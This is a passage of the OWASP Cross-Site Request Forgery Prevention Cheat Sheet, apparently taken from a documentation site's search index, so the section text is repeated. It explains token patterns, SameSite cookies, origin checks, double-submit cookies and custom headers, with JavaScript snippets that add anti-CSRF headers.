Prevention Cheat Sheet for detailed guidance on how to prevent XSS flaws. Do not use GET requests for state changing operations. If for any reason you do it, you have to also protect those resources against CSRF Token Based Mitigation \u00b6 This defense is one of the most popular and recommended methods to mitigate CSRF. It can be achieved either with state ( synchronizer token pattern ) or stateless ( encrypted or hashed based token pattern). Use Built-In Or Existing CSRF Implementations for CSRF Protection \u00b6 Synchronizer token defenses have been built into many frameworks. It is strongly recommended to research if the framework you are using has an option to achieve CSRF protection by default before trying to build your custom token generating system. For example, .NET has built-in protection that adds a token to CSRF vulnerable resources. You are responsible for proper configuration (such as key management and token management) before using these built-in CSRF protections that generate tokens to guard CSRF vulnerable resources. External components that add CSRF defenses to existing applications are also recommended. Examples: For Java: OWASP CSRF Guard or Spring Security For PHP and Apache: CSRFProtector Project For AngularJS: Cross-Site Request Forgery (XSRF) Protection Synchronizer Token Pattern \u00b6 CSRF tokens should be generated on the server-side. They can be generated once per user session or for each request. Per-request tokens are more secure than per-session tokens as the time range for an attacker to exploit the stolen tokens is minimal. However, this may result in usability concerns. For example, the \"Back\" button browser capability is often hindered as the previous page may contain a token that is no longer valid. Interaction with this previous page will result in a CSRF false positive security event at the server. In per-session token implementation after initial generation of token, the value is stored in the session and is used for each subsequent request until the session expires. When a request is issued by the client, the server-side component must verify the existence and validity of the token in the request compared to the token found in the user session. If the token was not found within the request, or the value provided does not match the value within the user session, then the request should be aborted, session of the user terminated and the event logged as a potential CSRF attack in progress. CSRF tokens should be: Unique per user session. Secret Unpredictable (large random value generated by a secure method ). CSRF tokens prevent CSRF because without token, attacker cannot create a valid requests to the backend server. CSRF tokens should not be transmitted using cookies. The CSRF token can be added through hidden fields, headers, and can be used with forms, and AJAX calls. Make sure that the token is not leaked in the server logs, or in the URL. CSRF tokens in GET requests are potentially leaked at several locations, such as the browser history, log files, network appliances that log the first line of an HTTP request, and Referer headers if the protected site links to an external site. For example: < form action = \"/transfer.do\" method = \"post\" > < input type = \"hidden\" name = \"CSRFToken\" value = \"OWY4NmQwODE4ODRjN2Q2NTlhMmZlYWEwYzU1YWQwMTVhM2JmNGYxYjJiMGI4MjJjZDE1ZDZMGYwMGEwOA==\" > [...] </ form > Inserting the CSRF token in the custom HTTP request header via JavaScript is considered more secure than adding the token in the hidden field form parameter because it uses custom request headers . Encryption based Token Pattern \u00b6 The Encrypted Token Pattern leverages an encryption, rather than comparison method of Token-validation. It is most suitable for applications that do not want to maintain any state at server side. The server generates a token comprised of the user's session ID and a timestamp (to prevent replay attacks) using a unique key available only on the server (AES256-with GCM mode/GCM-SIV is recommended. Usage of ECB mode is strictly not recommended. If you would like to use any other block cipher mode of operation, refer here and here for more information). This token is returned to the client and embedded in a hidden field for forms, in the request-header/parameter for AJAX requests. On receipt of this request, the server reads and decrypts the token value with the same key used to create the token. If the value cannot be decrypted then this suggests an intrusion attempt (which should be blocked and logged for debugging or incident response purposes). Once decrypted, the users session ID and timestamp contained within the token are validated. The session ID is compared against the currently logged in user, and the timestamp is compared against the current time to verify that its not beyond the defined token expiry time. If session ID matches and the timestamp is under the defined token expiry time, request is allowed. The Key Management Cheat Sheet contains best practices about managing encryption keys. HMAC Based Token Pattern \u00b6 HMAC Based Token Pattern mitigation is also achieved without maintaining any state at the server. HMAC based CSRF protection works similar to encryption based CSRF protection with a couple of minor differences It uses a strong HMAC function (SHA-256 or better is recommended) instead of an encryption function to generate the token. The token consists of a HMAC and timestamp. Below are the steps for the proper implementation of the HMAC based CSRF protection: Generate the token Using key K, generate HMAC(session ID + timestamp ) and append the same timestamp value to it which results in your CSRF token. Include the token ( i.e. HMAC+timestamp ) Include token in a hidden field for forms and in the request-header field/request body parameter for AJAX requests. Validating the token When the request is received at the server, re-generate the token with same key K (parameters are the session ID from the request and timestamp in the received token). If the HMAC in the received token and the one generated in this step match, verify if timestamp received is less than defined token expiry time. If both of them are success, then request is treated as legitimate and can be allowed. If not, block the request and log the attack for incident response purposes. The Key Management Cheat Sheet contains best practices about managing the HMAC key. Defense In Depth Techniques \u00b6 SameSite Cookie Attribute \u00b6 SameSite is a cookie attribute (similar to HTTPOnly, Secure etc.) which aims to mitigate CSRF attacks. It is defined in RFC6265bis . This attribute helps the browser decide whether to send cookies along with cross-site requests. Possible values for this attribute are Lax , Strict , or None . The Strict value will prevent the cookie from being sent by the browser to the target site in all cross-site browsing context, even when following a regular link. For example, for a GitHub-like website this would mean that if a logged-in user follows a link to a private GitHub project posted on a corporate discussion forum or email, GitHub will not receive the session cookie and the user will not be able to access the project. A bank website however doesn't want to allow any transactional pages to be linked from external sites, so the Strict flag would be most appropriate. The default Lax value provides a reasonable balance between security and usability for websites that want to maintain user's logged-in session after the user arrives from an external link. In the above GitHub scenario, the session cookie would be allowed when following a regular link from an external website while blocking it in CSRF-prone request methods such as POST. Only cross-site-requests that are allowed in Lax mode are the ones that have top-level navigations and are also safe HTTP methods. For more details on the SameSite values, check the following section from the rfc . Example of cookies using this attribute: Set-Cookie: JSESSIONID=xxxxx; SameSite=Strict Set-Cookie: JSESSIONID=xxxxx; SameSite=Lax All desktop browsers and almost all mobile browsers now support the SameSite attribute. To keep track of the browsers implementing it and the usage of the attribute, refer to the following service . Note that Chrome has announced that they will mark cookies as SameSite=Lax by default from Chrome 80 (due in February 2020), and Firefox and Edge are both planning to follow suit. Additionally, the Secure flag will be required for cookies that are marked as SameSite=None . It is important to note that this attribute should be implemented as an additional layer defense in depth concept. This attribute protects the user through the browsers supporting it, and it contains as well 2 ways to bypass it as mentioned in the following section . This attribute should not replace having a CSRF Token. Instead, it should co-exist with that token in order to protect the user in a more robust way. Verifying Origin With Standard Headers \u00b6 There are two steps to this mitigation, both of which rely on examining an HTTP request header value. Determining the origin the request is coming from (source origin). Can be done via Origin or Referer headers. Determining the origin the request is going to (target origin). At server side we verify if both of them match. If they do, we accept the request as legitimate (meaning it's the same origin request) and if they don't, we discard the request (meaning that the request originated from cross-domain). Reliability on these headers comes from the fact that they cannot be altered programmatically (using JavaScript with an XSS vulnerability) as they fall under forbidden headers list, meaning that only the browser can set them Identifying Source Origin (via Origin/Referer header) \u00b6 Checking the Origin Header \u00b6 If the Origin header is present, verify that its value matches the target origin. Unlike the Referer, the Origin header will be present in HTTP requests that originate from an HTTPS URL. Checking the Referer Header \u00b6 If the Origin header is not present, verify the hostname in the Referer header matches the target origin. This method of CSRF mitigation is also commonly used with unauthenticated requests, such as requests made prior to establishing a session state, which is required to keep track of a synchronization token. In both cases, make sure the target origin check is strong. For example, if your site is example.org make sure example.org.attacker.com does not pass your origin check (i.e, match through the trailing / after the origin to make sure you are matching against the entire origin). If neither of these headers are present, you can either accept or block the request. We recommend blocking . Alternatively, you might want to log all such instances, monitor their use cases/behavior, and then start blocking requests only after you get enough confidence. Identifying the Target Origin \u00b6 You might think it's easy to determine the target origin, but it's frequently not. The first thought is to simply grab the target origin (i.e., its hostname and port # ) from the URL in the request. However, the application server is frequently sitting behind one or more proxies and the original URL is different from the URL the app server actually receives. If your application server is directly accessed by its users, then using the origin in the URL is fine and you're all set. If you are behind a proxy, there are a number of options to consider. Configure your application to simply know its target origin: It's your application, so you can find its target origin and set that value in some server configuration entry. This would be the most secure approach as it's defined server side, so it is a trusted value. However, this might be problematic to maintain if your application is deployed in many places, e.g., dev, test, QA, production, and possibly multiple production instances. Setting the correct value for each of these situations might be difficult, but if you can do it via some central configuration and providing your instances to grab value from it, that's great! ( Note: Make sure the centralized configuration store is maintained securely because major part of your CSRF defense depends on it.) Use the Host header value: If you prefer that the application find its own target so it doesn't have to be configured for each deployed instance, we recommend using the Host family of headers. The Host header's purpose is to contain the target origin of the request. But, if your app server is sitting behind a proxy, the Host header value is most likely changed by the proxy to the target origin of the URL behind the proxy, which is different than the original URL. This modified Host header origin won't match the source origin in the original Origin or Referer headers. Use the X-Forwarded-Host header value: To avoid the issue of proxy altering the host header, there is another header called X-Forwarded-Host, whose purpose is to contain the original Host header value the proxy received. Most proxies will pass along the original Host header value in the X-Forwarded-Host header. So that header value is likely to be the target origin value you need to compare to the source origin in the Origin or Referer header. This mitigation is working properly when origin or referrer headers are present in the requests. Though these headers are included majority of the time, there are few use cases where they are not included (most of them are for legitimate reasons to safeguard users privacy/to tune to browsers ecosystem). The following lists some use cases: Internet Explorer 11 does not add the Origin header on a CORS request across sites of a trusted zone. The Referer header will remain the only indication of the UI origin. See the following references in Stack Overflow here and here . In an instance following a 302 redirect cross-origin , Origin is not included in the redirected request because that may be considered sensitive information that should not be sent to the other origin. There are some privacy contexts where Origin is set to \"null\" For example, see the following here . Origin header is included for all cross origin requests but for same origin requests, in most browsers it is only included in POST/DELETE/PUT Note: Although it is not ideal, many developers use GET requests to do state changing operations. Referer header is no exception. There are multiple use cases where referrer header is omitted as well ( 1 , 2 , 3 , 4 and 5 ). Load balancers, proxies and embedded network devices are also well known to strip the referrer header due to privacy reasons in logging them. Usually, a minor percentage of traffic does fall under above categories ( 1-2% ) and no enterprise would want to lose this traffic. One of the popular technique used across the Internet to make this technique more usable is to accept the request if the Origin/referrer matches your configured list of domains \"OR\" a null value (Examples here . The null value is to cover the edge cases mentioned above where these headers are not sent). Please note that, attackers can exploit this but people prefer to use this technique as a defense in depth measure because of the minor effort involved in deploying it. Double Submit Cookie \u00b6 If maintaining the state for CSRF token at server side is problematic, an alternative defense is to use the double submit cookie technique. This technique is easy to implement and is stateless. In this technique, we send a random value in both a cookie and as a request parameter, with the server verifying if the cookie value and request value match. When a user visits (even before authenticating to prevent login CSRF), the site should generate a (cryptographically strong) pseudorandom value and set it as a cookie on the user's machine separate from the session identifier. The site then requires that every transaction request include this pseudorandom value as a hidden form value (or other request parameter/header). If both of them match at server side, the server accepts it as legitimate request and if they don't, it would reject the request. Because subdomains can write cookies to the parent domains and because cookies can be set for the domain over plain HTTP connections this technique works as long as you are sure that your subdomains are fully secured and only accept HTTPS connections. To enhance the security of this solution include the token in an encrypted cookie - other than the authentication cookie (since they are often shared within subdomains) - and then at the server side match it (after decrypting the encrypted cookie) with the token in hidden form field or parameter/header for AJAX calls. This works because a sub domain has no way to over-write an properly crafted encrypted cookie without the necessary information such as encryption key. A simpler alternative to an encrypted cookie is to HMAC the token with a secret key known only by the server and place this value in a cookie. This is similar to an encrypted cookie (both require knowledge only the server holds), but is less computationally intensive than encrypting and decrypting the cookie. Whether encryption or a HMAC is used, an attacker won't be able to recreate the cookie value from the plain token without knowledge of the server secrets. Cookie with __Host- prefix \u00b6 Another solution for this problem is use of Cookie Prefixes for cookie with CSRF token. If cookie has __Host- prefix e.g. Set-Cookie: __Host-token=RANDOM; path=/; Secure then the cookie: Cannot be (over)written from another subdomain. Must have the path of / . Must be marked as Secure (i.e, cannot be sent over unencrypted HTTP). As of July 2020 cookie prefixes are supported by all major browsers except Internet Explorer . See the Mozilla Developer Network and IETF Draft for further information about cookie prefixes. Use of Custom Request Headers \u00b6 Adding CSRF tokens, a double submit cookie and value, an encrypted token, or other defense that involves changing the UI can frequently be complex or otherwise problematic. An alternate defense that is particularly well suited for AJAX or API endpoints is the use of a custom request header . This defense relies on the same-origin policy (SOP) restriction that only JavaScript can be used to add a custom header, and only within its origin. By default, browsers do not allow JavaScript to make cross origin requests with custom headers. If this is the case for your system, you can simply verify the presence of this header and value on all your server side AJAX endpoints in order to protect against CSRF attacks. This approach has the double advantage of usually requiring no UI changes and not introducing any server side state, which is particularly attractive to REST services. You can always add your own custom header and value if that is preferred. This technique obviously works for AJAX calls, but you still need to protect <form> tags with approaches described in this document such as tokens. Also, CORS configuration should also be robust to make this solution work effectively (as custom headers for requests coming from other domains trigger a pre-flight CORS check). User Interaction Based CSRF Defense \u00b6 While all the techniques referenced here do not require any user interaction, sometimes it's easier or more appropriate to involve the user in the transaction to prevent unauthorized operations (forged via CSRF or otherwise). The following are some examples of techniques that can act as strong CSRF defense when implemented correctly. Re-Authentication (password or stronger) One-time Token CAPTCHA While these are a very strong CSRF defense, it can create a significant impact on the user experience. As such, they would generally only be used for security critical operations (such as password change, money transfers, etc.), alongside the other defences discussed in this cheat sheet. Login CSRF \u00b6 Most developers tend to ignore CSRF vulnerability on login forms as they assume that CSRF would not be applicable on login forms because user is not authenticated at that stage, however this assumption is not always true. CSRF vulnerabilities can still occur on login forms where the user is not authenticated, but the impact and risk is different. For example, if an attacker uses CSRF to authenticate a victim on a shopping website using the attacker's account, and the victim then enters their credit card information, an attacker may be able to purchase items using the victim's stored card details. For more information about login CSRF and other risks, see section 3 of this paper. Login CSRF can be mitigated by creating pre-sessions (sessions before a user is authenticated) and including tokens in login form. You can use any of the techniques mentioned above to generate tokens. Remember that pre-sessions cannot be transitioned to real sessions once the user is authenticated - the session should be destroyed and a new one should be made to avoid session fixation attacks . This technique is described in Robust Defenses for Cross-Site Request Forgery section 4.1 . If sub-domains under your master domain are not trusted in your threat model, it is difficult to mitigate login CSRF. A strict subdomain and path level referrer header validation can be used in these cases for mitigating CSRF on login forms to an extent. Java Reference Example \u00b6 The following JEE web filter provides an example reference for some of the concepts described in this cheatsheet. It implements the following stateless mitigations ( OWASP CSRFGuard , cover a stateful approach). Verifying same origin with standard headers Double submit cookie SameSite cookie attribute Please note that it only acts a reference sample and is not complete (for example: it doesn't have a block to direct the control flow when origin and referrer header check succeeds nor it has a port/host/protocol level validation for referrer header). Developers are recommended to build their complete mitigation on top of this reference sample. Developers should also implement standard authentication or authorization checks before checking for CSRF. Full source is located here and provides a runnable POC. JavaScript Guidance for Auto-inclusion of CSRF tokens as an AJAX Request header \u00b6 The following guidance considers GET , HEAD and OPTIONS methods are safe operations. Therefore GET , HEAD , and OPTIONS method AJAX calls need not be appended with a CSRF token header. However, if the verbs are used to perform state changing operations, they will also require a CSRF token header (although this is bad practice, and should be avoided). The POST , PUT , PATCH , and DELETE methods, being state changing verbs, should have a CSRF token attached to the request. The following guidance will demonstrate how to create overrides in JavaScript libraries to have CSRF tokens included automatically with every AJAX request for the state changing methods mentioned above. Storing the CSRF Token Value in the DOM \u00b6 A CSRF token can be included in the <meta> tag as shown below. All subsequent calls in the page can extract the CSRF token from this <meta> tag. It can also be stored in a JavaScript variable or anywhere on the DOM. However, it is not recommended to store it in cookies or browser local storage. The following code snippet can be used to include a CSRF token as a <meta> tag: < meta name = \"csrf-token\" content = \"{{ csrf_token() }}\" > The exact syntax of populating the content attribute would depend on your web application's backend programming language. Overriding Defaults to Set Custom Header \u00b6 Several JavaScript libraries allow for overriding default settings to have a header added automatically to all AJAX requests. XMLHttpRequest (Native JavaScript) \u00b6 XMLHttpRequest's open() method can be overridden to set the anti-csrf-token header whenever the open() method is invoked next. The function csrfSafeMethod() defined below will filter out the safe HTTP methods and only add the header to unsafe HTTP methods. This can be done as demonstrated in the following code snippet: < script type = \"text/javascript\" > var csrf_token = document . querySelector ( \"meta[name='csrf-token']\" ). getAttribute ( \"content\" ); function csrfSafeMethod ( method ) { // these HTTP methods do not require CSRF protection return ( /^(GET|HEAD|OPTIONS)$/ . test ( method )); } var o = XMLHttpRequest . prototype . open ; XMLHttpRequest . prototype . open = function (){ var res = o . apply ( this , arguments ); var err = new Error (); if ( ! csrfSafeMethod ( arguments [ 0 ])) { this . setRequestHeader ( 'anti-csrf-token' , csrf_token ); } return res ; }; </ script > AngularJS \u00b6 AngularJS allows for setting default headers for HTTP operations. Further documentation can be found at AngularJS's documentation for $httpProvider . < script > var csrf_token = document . querySelector ( \"meta[name='csrf-token']\" ). getAttribute ( \"content\" ); var app = angular . module ( \"app\" , []); app . config ([ '$httpProvider' , function ( $httpProvider ) { $httpProvider . defaults . headers . post [ \"anti-csrf-token\" ] = csrf_token ; $httpProvider . defaults . headers . put [ \"anti-csrf-token\" ] = csrf_token ; $httpProvider . defaults . headers . patch [ \"anti-csrf-token\" ] = csrf_token ; // AngularJS does not create an object for DELETE and TRACE methods by default, and has to be manually created. $httpProvider . defaults . headers . delete = { \"Content-Type\" : \"application/json;charset=utf-8\" , \"anti-csrf-token\" : csrf_token }; $httpProvider . defaults . headers . trace = { \"Content-Type\" : \"application/json;charset=utf-8\" , \"anti-csrf-token\" : csrf_token }; }]); </ script > This code snippet has been tested with AngularJS version 1.7.7. Axios \u00b6 Axios allows us to set default headers for the POST, PUT, DELETE and PATCH actions. < script type = \"text/javascript\" > var csrf_token = document . querySelector ( \"meta[name='csrf-token']\" ). getAttribute ( \"content\" ); axios . defaults . headers . post [ 'anti-csrf-token' ] = csrf_token ; axios . defaults . headers . put [ 'anti-csrf-token' ] = csrf_token ; axios . defaults . headers . delete [ 'anti-csrf-token' ] = csrf_token ; axios . defaults . headers . patch [ 'anti-csrf-token' ] = csrf_token ; // Axios does not create an object for TRACE method by default, and has to be created manually. axios . defaults . headers . trace = {} axios . defaults . headers . trace [ 'anti-csrf-token' ] = csrf_token </ script > This code snippet has been tested with Axios version 0.18.0. JQuery \u00b6 JQuery exposes an API called $.ajaxSetup() which can be used to add the anti-csrf-token header to the AJAX request. API documentation for $.ajaxSetup() can be found here. The function csrfSafeMethod() defined below will filter out the safe HTTP methods and only add the header to unsafe HTTP methods. You can configure jQuery to automatically add the token to all request headers by adopting the following code snippet. This provides a simple and convenient CSRF protection for your AJAX based applications: < script type = \"text/javascript\" > var csrf_token = $ ( 'meta[name=\"csrf-token\"]' ). attr ( 'content' ); function csrfSafeMethod ( method ) { // these HTTP methods do not require CSRF protection return ( /^(GET|HEAD|OPTIONS)$/ . test ( method )); } $ . ajaxSetup ({ beforeSend : function ( xhr , settings ) { if ( ! csrfSafeMethod ( settings . type ) && ! this . crossDomain ) { xhr . setRequestHeader ( \"anti-csrf-token\" , csrf_token ); } } }); </ script > This code snippet has been tested with jQuery version 3.3.1. References \u00b6 CSRF \u00b6 OWASP Cross-Site Request Forgery (CSRF) PortSwigger Web Security Academy Mozilla Web Security Cheat Sheet Common CSRF Prevention Misconceptions Robust Defenses for Cross-Site Request Forgery","title":"Cross-Site Request Forgery Prevention"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#cross-site-request-forgery-prevention-cheat-sheet","text":"","title":"Cross-Site Request Forgery Prevention Cheat Sheet"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#introduction","text":"Cross-Site Request Forgery (CSRF) is a type of attack that occurs when a malicious web site, email, blog, instant message, or program causes a user's web browser to perform an unwanted action on a trusted site when the user is authenticated. A CSRF attack works because browser requests automatically include all cookies including session cookies. Therefore, if the user is authenticated to the site, the site cannot distinguish between legitimate requests and forged requests. The impact of a successful CSRF attack is limited to the capabilities exposed by the vulnerable application and privileges of the user. For example, this attack could result in a transfer of funds, changing a password, or making a purchase with the user's credentials. In effect, CSRF attacks are used by an attacker to make a target system perform a function via the victim's browser, without the victim's knowledge, at least until the unauthorized transaction has been committed. In short, the following principles should be followed to defend against CSRF: Check if your framework has built-in CSRF protection and use it If framework does not have built-in CSRF protection add CSRF tokens to all state changing requests (requests that cause actions on the site) and validate them on backend Always use SameSite Cookie Attribute for session cookies Implement at least one mitigation from Defense in Depth Mitigations section Use custom request headers Verify the origin with standard headers Use double submit cookies Consider implementing user interaction based protection for highly sensitive operations Remember that any Cross-Site Scripting (XSS) can be used to defeat all CSRF mitigation techniques! See the OWASP XSS Prevention Cheat Sheet for detailed guidance on how to prevent XSS flaws. Do not use GET requests for state changing operations. If for any reason you do it, you have to also protect those resources against CSRF","title":"Introduction"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#token-based-mitigation","text":"This defense is one of the most popular and recommended methods to mitigate CSRF. It can be achieved either with state ( synchronizer token pattern ) or stateless ( encrypted or hashed based token pattern).","title":"Token Based Mitigation"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#use-built-in-or-existing-csrf-implementations-for-csrf-protection","text":"Synchronizer token defenses have been built into many frameworks. It is strongly recommended to research if the framework you are using has an option to achieve CSRF protection by default before trying to build your custom token generating system. For example, .NET has built-in protection that adds a token to CSRF vulnerable resources. You are responsible for proper configuration (such as key management and token management) before using these built-in CSRF protections that generate tokens to guard CSRF vulnerable resources. External components that add CSRF defenses to existing applications are also recommended. Examples: For Java: OWASP CSRF Guard or Spring Security For PHP and Apache: CSRFProtector Project For AngularJS: Cross-Site Request Forgery (XSRF) Protection","title":"Use Built-In Or Existing CSRF Implementations for CSRF Protection"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#synchronizer-token-pattern","text":"CSRF tokens should be generated on the server-side. They can be generated once per user session or for each request. Per-request tokens are more secure than per-session tokens as the time range for an attacker to exploit the stolen tokens is minimal. However, this may result in usability concerns. For example, the \"Back\" button browser capability is often hindered as the previous page may contain a token that is no longer valid. Interaction with this previous page will result in a CSRF false positive security event at the server. In per-session token implementation after initial generation of token, the value is stored in the session and is used for each subsequent request until the session expires. When a request is issued by the client, the server-side component must verify the existence and validity of the token in the request compared to the token found in the user session. If the token was not found within the request, or the value provided does not match the value within the user session, then the request should be aborted, session of the user terminated and the event logged as a potential CSRF attack in progress. CSRF tokens should be: Unique per user session. Secret Unpredictable (large random value generated by a secure method ). CSRF tokens prevent CSRF because without token, attacker cannot create a valid requests to the backend server. CSRF tokens should not be transmitted using cookies. The CSRF token can be added through hidden fields, headers, and can be used with forms, and AJAX calls. Make sure that the token is not leaked in the server logs, or in the URL. CSRF tokens in GET requests are potentially leaked at several locations, such as the browser history, log files, network appliances that log the first line of an HTTP request, and Referer headers if the protected site links to an external site. For example: < form action = \"/transfer.do\" method = \"post\" > < input type = \"hidden\" name = \"CSRFToken\" value = \"OWY4NmQwODE4ODRjN2Q2NTlhMmZlYWEwYzU1YWQwMTVhM2JmNGYxYjJiMGI4MjJjZDE1ZDZMGYwMGEwOA==\" > [...] </ form > Inserting the CSRF token in the custom HTTP request header via JavaScript is considered more secure than adding the token in the hidden field form parameter because it uses custom request headers .","title":"Synchronizer Token Pattern"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#encryption-based-token-pattern","text":"The Encrypted Token Pattern leverages an encryption, rather than comparison method of Token-validation. It is most suitable for applications that do not want to maintain any state at server side. The server generates a token comprised of the user's session ID and a timestamp (to prevent replay attacks) using a unique key available only on the server (AES256-with GCM mode/GCM-SIV is recommended. Usage of ECB mode is strictly not recommended. If you would like to use any other block cipher mode of operation, refer here and here for more information). This token is returned to the client and embedded in a hidden field for forms, in the request-header/parameter for AJAX requests. On receipt of this request, the server reads and decrypts the token value with the same key used to create the token. If the value cannot be decrypted then this suggests an intrusion attempt (which should be blocked and logged for debugging or incident response purposes). Once decrypted, the users session ID and timestamp contained within the token are validated. The session ID is compared against the currently logged in user, and the timestamp is compared against the current time to verify that its not beyond the defined token expiry time. If session ID matches and the timestamp is under the defined token expiry time, request is allowed. The Key Management Cheat Sheet contains best practices about managing encryption keys.","title":"Encryption based Token Pattern"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#hmac-based-token-pattern","text":"HMAC Based Token Pattern mitigation is also achieved without maintaining any state at the server. HMAC based CSRF protection works similar to encryption based CSRF protection with a couple of minor differences It uses a strong HMAC function (SHA-256 or better is recommended) instead of an encryption function to generate the token. The token consists of a HMAC and timestamp. Below are the steps for the proper implementation of the HMAC based CSRF protection: Generate the token Using key K, generate HMAC(session ID + timestamp ) and append the same timestamp value to it which results in your CSRF token. Include the token ( i.e. HMAC+timestamp ) Include token in a hidden field for forms and in the request-header field/request body parameter for AJAX requests. Validating the token When the request is received at the server, re-generate the token with same key K (parameters are the session ID from the request and timestamp in the received token). If the HMAC in the received token and the one generated in this step match, verify if timestamp received is less than defined token expiry time. If both of them are success, then request is treated as legitimate and can be allowed. If not, block the request and log the attack for incident response purposes. The Key Management Cheat Sheet contains best practices about managing the HMAC key.","title":"HMAC Based Token Pattern"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#defense-in-depth-techniques","text":"","title":"Defense In Depth Techniques"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#samesite-cookie-attribute","text":"SameSite is a cookie attribute (similar to HTTPOnly, Secure etc.) which aims to mitigate CSRF attacks. It is defined in RFC6265bis . This attribute helps the browser decide whether to send cookies along with cross-site requests. Possible values for this attribute are Lax , Strict , or None . The Strict value will prevent the cookie from being sent by the browser to the target site in all cross-site browsing context, even when following a regular link. For example, for a GitHub-like website this would mean that if a logged-in user follows a link to a private GitHub project posted on a corporate discussion forum or email, GitHub will not receive the session cookie and the user will not be able to access the project. A bank website however doesn't want to allow any transactional pages to be linked from external sites, so the Strict flag would be most appropriate. The default Lax value provides a reasonable balance between security and usability for websites that want to maintain user's logged-in session after the user arrives from an external link. In the above GitHub scenario, the session cookie would be allowed when following a regular link from an external website while blocking it in CSRF-prone request methods such as POST. Only cross-site-requests that are allowed in Lax mode are the ones that have top-level navigations and are also safe HTTP methods. For more details on the SameSite values, check the following section from the rfc . Example of cookies using this attribute: Set-Cookie: JSESSIONID=xxxxx; SameSite=Strict Set-Cookie: JSESSIONID=xxxxx; SameSite=Lax All desktop browsers and almost all mobile browsers now support the SameSite attribute. To keep track of the browsers implementing it and the usage of the attribute, refer to the following service . Note that Chrome has announced that they will mark cookies as SameSite=Lax by default from Chrome 80 (due in February 2020), and Firefox and Edge are both planning to follow suit. Additionally, the Secure flag will be required for cookies that are marked as SameSite=None . It is important to note that this attribute should be implemented as an additional layer defense in depth concept. This attribute protects the user through the browsers supporting it, and it contains as well 2 ways to bypass it as mentioned in the following section . This attribute should not replace having a CSRF Token. Instead, it should co-exist with that token in order to protect the user in a more robust way.","title":"SameSite Cookie Attribute"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#verifying-origin-with-standard-headers","text":"There are two steps to this mitigation, both of which rely on examining an HTTP request header value. Determining the origin the request is coming from (source origin). Can be done via Origin or Referer headers. Determining the origin the request is going to (target origin). At server side we verify if both of them match. If they do, we accept the request as legitimate (meaning it's the same origin request) and if they don't, we discard the request (meaning that the request originated from cross-domain). Reliability on these headers comes from the fact that they cannot be altered programmatically (using JavaScript with an XSS vulnerability) as they fall under forbidden headers list, meaning that only the browser can set them","title":"Verifying Origin With Standard Headers"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#identifying-source-origin-via-originreferer-header","text":"","title":"Identifying Source Origin (via Origin/Referer header)"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#checking-the-origin-header","text":"If the Origin header is present, verify that its value matches the target origin. Unlike the Referer, the Origin header will be present in HTTP requests that originate from an HTTPS URL.","title":"Checking the Origin Header"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#checking-the-referer-header","text":"If the Origin header is not present, verify the hostname in the Referer header matches the target origin. This method of CSRF mitigation is also commonly used with unauthenticated requests, such as requests made prior to establishing a session state, which is required to keep track of a synchronization token. In both cases, make sure the target origin check is strong. For example, if your site is example.org make sure example.org.attacker.com does not pass your origin check (i.e, match through the trailing / after the origin to make sure you are matching against the entire origin). If neither of these headers are present, you can either accept or block the request. We recommend blocking . Alternatively, you might want to log all such instances, monitor their use cases/behavior, and then start blocking requests only after you get enough confidence.","title":"Checking the Referer Header"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#identifying-the-target-origin","text":"You might think it's easy to determine the target origin, but it's frequently not. The first thought is to simply grab the target origin (i.e., its hostname and port # ) from the URL in the request. However, the application server is frequently sitting behind one or more proxies and the original URL is different from the URL the app server actually receives. If your application server is directly accessed by its users, then using the origin in the URL is fine and you're all set. If you are behind a proxy, there are a number of options to consider. Configure your application to simply know its target origin: It's your application, so you can find its target origin and set that value in some server configuration entry. This would be the most secure approach as it's defined server side, so it is a trusted value. However, this might be problematic to maintain if your application is deployed in many places, e.g., dev, test, QA, production, and possibly multiple production instances. Setting the correct value for each of these situations might be difficult, but if you can do it via some central configuration and providing your instances to grab value from it, that's great! ( Note: Make sure the centralized configuration store is maintained securely because major part of your CSRF defense depends on it.) Use the Host header value: If you prefer that the application find its own target so it doesn't have to be configured for each deployed instance, we recommend using the Host family of headers. The Host header's purpose is to contain the target origin of the request. But, if your app server is sitting behind a proxy, the Host header value is most likely changed by the proxy to the target origin of the URL behind the proxy, which is different than the original URL. This modified Host header origin won't match the source origin in the original Origin or Referer headers. Use the X-Forwarded-Host header value: To avoid the issue of proxy altering the host header, there is another header called X-Forwarded-Host, whose purpose is to contain the original Host header value the proxy received. Most proxies will pass along the original Host header value in the X-Forwarded-Host header. So that header value is likely to be the target origin value you need to compare to the source origin in the Origin or Referer header. This mitigation is working properly when origin or referrer headers are present in the requests. Though these headers are included majority of the time, there are few use cases where they are not included (most of them are for legitimate reasons to safeguard users privacy/to tune to browsers ecosystem). The following lists some use cases: Internet Explorer 11 does not add the Origin header on a CORS request across sites of a trusted zone. The Referer header will remain the only indication of the UI origin. See the following references in Stack Overflow here and here . In an instance following a 302 redirect cross-origin , Origin is not included in the redirected request because that may be considered sensitive information that should not be sent to the other origin. There are some privacy contexts where Origin is set to \"null\" For example, see the following here . Origin header is included for all cross origin requests but for same origin requests, in most browsers it is only included in POST/DELETE/PUT Note: Although it is not ideal, many developers use GET requests to do state changing operations. Referer header is no exception. There are multiple use cases where referrer header is omitted as well ( 1 , 2 , 3 , 4 and 5 ). Load balancers, proxies and embedded network devices are also well known to strip the referrer header due to privacy reasons in logging them. Usually, a minor percentage of traffic does fall under above categories ( 1-2% ) and no enterprise would want to lose this traffic. One of the popular technique used across the Internet to make this technique more usable is to accept the request if the Origin/referrer matches your configured list of domains \"OR\" a null value (Examples here . The null value is to 